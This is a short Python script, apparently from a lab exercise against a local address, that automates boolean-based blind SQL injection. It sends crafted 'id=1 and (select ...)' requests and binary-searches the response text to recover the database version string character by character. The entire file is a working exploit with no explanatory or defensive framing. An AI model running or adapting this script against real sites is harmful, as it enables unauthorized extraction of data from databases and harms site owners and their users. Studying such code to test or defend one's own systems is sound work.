import requests

def find_ascii_value(inj_str):
    low = 33
    high = 126
    while low <= high:
        mid = (low + high) // 2

        response = requests.get(inj_str.replace("[ASCII]", str(mid)))

        if "This record exists." in response.text:
            low = mid + 1
        else:
            high = mid - 1
    return low

def find_version_length():
    low = 0
    high = 51
    
    while low <= high:
        mid = (low + high) // 2
        print(mid)
        response = requests.get(f"http://192.168.93.128/?id=1 and (select length(@@version) > {mid} )")
        print(response.text)
        if "This record exists." in response.text:
            low = mid + 1
        else:
            high = mid - 1
    return low



def extract_data():
    result_str = ""
    length = find_version_length()
    
    for i in range(1, length+1): 
        inj_str = f"http://192.168.93.128/?id=1 and (select ascii(substring(@@version,{i},1))>[ASCII])"
        result = find_ascii_value(inj_str)
        if result < 33 or result > 126:
            break
        if result:
            result_str += chr(result)
            print(result_str)
        

extract_data()
